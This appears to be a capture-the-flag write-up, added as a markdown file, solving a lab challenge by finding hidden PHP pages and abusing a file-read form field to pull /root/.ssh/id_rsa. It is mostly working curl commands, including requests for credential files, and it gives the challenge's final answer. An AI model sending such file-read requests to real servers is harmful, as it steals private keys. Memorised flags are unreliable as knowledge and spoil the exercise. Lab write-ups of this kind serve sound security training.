@@ -1,0 +1,217 @@
+# Challenge 115 – SSH Private Key Extraction
+
+## Question
+
+> The machine `192.168.1.151` contains an SSH private key. Identify the key and submit the last five characters of its Base64-encoded content, found between the BEGIN and END key tags.
+
+**Target:** `192.168.1.151`
+
+**Answer Format:** `NxXXX`
+
+**Final Answer:** `5oMBD`
+
+---
+
+## Step 1 – Discover the Web Application
+
+The target machine had HTTP running on port 80.
+
+We accessed the login page:
+
+```bash
+curl -i http://192.168.1.151/login.php
+```
+
+The response indicated that `login.php` was available.
+
+---
+
+## Step 2 – Test the Login Endpoint
+
+We sent a test POST request:
+
+```bash
+curl -i -s -X POST -d 'username=test&password=test&login=Login' http://192.168.1.151/login.php
+```
+
+The response redirected us to:
+
+```text
+s3cret_page.php
+```
+
+This revealed another PHP page.
+
+---
+
+## Step 3 – Access `s3cret_page.php`
+
+We requested the page:
+
+```bash
+curl -i -s http://192.168.1.151/s3cret_page.php
+```
+
+The response contained:
+
+```text
+Can you read fast?? killmyeye.php
+```
+
+This revealed another PHP endpoint:
+
+```text
+killmyeye.php
+```
+
+---
+
+## Step 4 – Examine `killmyeye.php`
+
+We accessed the page:
+
+```bash
+curl -i -s http://192.168.1.151/killmyeye.php
+```
+
+It displayed a form asking for a `target`:
+
+```html
+<form method="POST">
+    <label for="target">Read the root pass?</label>
+    <input name="target" type="text">
+    <input type="submit" name="Submit">
+</form>
+```
+
+The `target` parameter was used to read files from the server.
+
+---
+
+## Step 5 – Test File Reading
+
+Before accessing the SSH key, we tested the functionality with `/etc/hostname`:
+
+```bash
+curl -s -X POST -d 'target=/etc/hostname&Submit=1' http://192.168.1.151/killmyeye.php
+```
+
+The response contained Base64 data:
+
+```text
+UVdFUlRZVUlPUAo=
+```
+
+This confirmed that the endpoint was returning file contents encoded with Base64.
+
+---
+
+## Step 6 – Retrieve the SSH Private Key
+
+The challenge specifically asked for an SSH private key.
+
+We requested:
+
+```bash
+curl -s -X POST -d 'target=/root/.ssh/id_rsa&Submit=1' http://192.168.1.151/killmyeye.php
+```
+
+The response contained Base64-encoded data.
+
+The outer Base64 data was decoded to reveal:
+
+```text
+-----BEGIN RSA PRIVATE KEY-----
+...
+-----END RSA PRIVATE KEY-----
+```
+
+Therefore, we confirmed that the file was an RSA private key.
+
+---
+
+## Step 7 – Extract the Last Five Characters
+
+The response had two layers:
+
+```text
+HTTP response
+    ↓
+Outer Base64
+    ↓
+RSA private key in PEM format
+    ↓
+Base64 key content
+```
+
+We used the following command to extract the Base64 content between the RSA key tags and obtain its final five characters:
+
+```bash
+curl -s -X POST -d 'target=/root/.ssh/id_rsa&Submit=1' http://192.168.1.151/killmyeye.php | awk '/<pre>/{f=1; sub(/.*<pre>/,"")} /<\/pre>/{sub(/<\/pre>.*/,""); f=0} f' | tr -d '\n' | base64 -d | sed -n '/BEGIN RSA PRIVATE KEY/,/END RSA PRIVATE KEY/p' | sed '1d;$d' | tr -d '\n' | tail -c 5
+```
+
+Output:
+
+```text
+5oMBD
+```
+
+---
+
+## Step 8 – Final Answer
+
+The last five characters of the Base64-encoded content inside the RSA private key are:
+
+```text
+5oMBD
+```
+
+### Answer
+
+```text
+5oMBD
+```
+
+---
+
+## Important Commands Used
+
+### Find hidden page
+
+```bash
+curl -i -s -X POST -d 'username=test&password=test&login=Login' http://192.168.1.151/login.php
+```
+
+### Access discovered page
+
+```bash
+curl -i -s http://192.168.1.151/s3cret_page.php
+```
+
+### Test the file-reading functionality
+
+```bash
+curl -s -X POST -d 'target=/etc/hostname&Submit=1' http://192.168.1.151/killmyeye.php
+```
+
+### Retrieve SSH private key
+
+```bash
+curl -s -X POST -d 'target=/root/.ssh/id_rsa&Submit=1' http://192.168.1.151/killmyeye.php
+```
+
+### Extract Challenge 115 answer
+
+```bash
+curl -s -X POST -d 'target=/root/.ssh/id_rsa&Submit=1' http://192.168.1.151/killmyeye.php | awk '/<pre>/{f=1; sub(/.*<pre>/,"")} /<\/pre>/{sub(/<\/pre>.*/,""); f=0} f' | tr -d '\n' | base64 -d | sed -n '/BEGIN RSA PRIVATE KEY/,/END RSA PRIVATE KEY/p' | sed '1d;$d' | tr -d '\n' | tail -c 5
+```
+
+**Output:**
+
+```text
+5oMBD
+```
+
+## Result
+
+**Challenge 115 → `5oMBD`**
